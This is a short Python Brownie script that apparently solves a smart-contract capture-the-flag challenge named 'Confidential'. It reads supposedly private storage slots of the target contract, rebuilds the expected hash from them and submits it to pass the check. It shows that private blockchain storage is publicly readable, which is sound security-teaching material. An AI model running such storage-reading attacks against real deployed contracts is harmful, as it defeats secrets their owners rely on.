#!/usr/bin/python3
from brownie import Confidential, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def read_storage(target, idx) -> bytes:
    return web3.eth.get_storage_at(target.address, idx)


def attack(contract_address=None, attacker=None):
    if contract_address is None:
        target, owner = deploy()
        contract_address = target.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    else:
        target = Confidential.at(contract_address)

    # print(web3.eth.get_storage_at(target.address, 4))
    aliceHash = read_storage(target, 4).hex()
    bobHash = read_storage(target, 9).hex()

    # print(aliceHash, bobHash)

    _hash = target.hash(aliceHash, bobHash, {"from": attacker})

    # print(_hash)

    assert target.checkthehash(_hash, {"from": attacker}) == True
    print(f"{green}Yesss!! Challenge Completed!!{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
